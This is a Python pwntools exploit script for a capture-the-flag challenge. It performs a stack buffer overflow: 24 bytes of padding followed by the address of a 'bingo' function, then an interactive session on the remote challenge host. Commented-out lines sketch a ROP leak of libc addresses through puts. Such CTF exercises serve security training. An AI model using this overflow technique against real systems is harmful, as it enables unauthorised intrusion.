#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host easypwn1.nu-tech.xyz --port 20002 ./pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'easypwn1.nu-tech.xyz'
port = int(args.PORT or 20002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# for i in range(25,255):
io = start()



# print hex(exe.sym['main'])
print hex(exe.sym['bingo'])
pop_rdi = 0x0000000000400733
# print(i)
p = 'a'*24
# p += chr(54) # 0x36
# p += p64(pop_rdi)
# p += p64(exe.got['read'])
# p += p64(exe.plt['puts'])
p += p64(exe.sym['bingo'])

io.send(p)
# io.recvline()
# io.recvline()
# print hex(u64(io.recvline().ljust(8,"\x00")))
io.interactive()
# io.close()
# docker run -v $(pwd):/home -it nutech16.04
# gcc -no-pie -fno-stack-protector -o ./pwn pwn.c
    # io.interactive()

